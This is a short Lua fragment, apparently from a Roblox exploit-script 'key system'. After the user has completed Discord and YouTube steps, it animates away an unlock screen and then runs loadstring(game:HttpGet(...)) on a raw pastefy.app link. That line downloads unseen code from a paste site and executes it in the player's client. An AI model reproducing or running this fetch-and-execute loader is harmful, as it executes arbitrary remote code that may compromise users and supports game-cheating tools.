-- UNLOCK FUNCTION
local function Unlock()
    -- Smooth exit animations
    TweenService:Create(Card, TweenInfo.new(0.4, Enum.EasingStyle.BackIn), {
        Position = UDim2.new(0.5, -160, 1.5, 0)
    }):Play()

    TweenService:Create(Backdrop, TweenInfo.new(0.4), {
        BackgroundTransparency = 1
    }):Play()

    TweenService:Create(Blur, TweenInfo.new(0.4), {
        Size = 0
    }):Play()

    task.wait(0.45)

    -- Complete cleanup
    Blur:Destroy()
    ScreenGui:Destroy()

    -- Safely run the target script payload
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/VeetMWsS/raw"))()
    end)
    
    if not success then
        warn("SyntaxUI Error executing loadstring script: ", err)
    end
end

local function CheckUnlock()
    if discordDone and youtubeDone then
        task.wait(0.6)
        Unlock()
    end
end

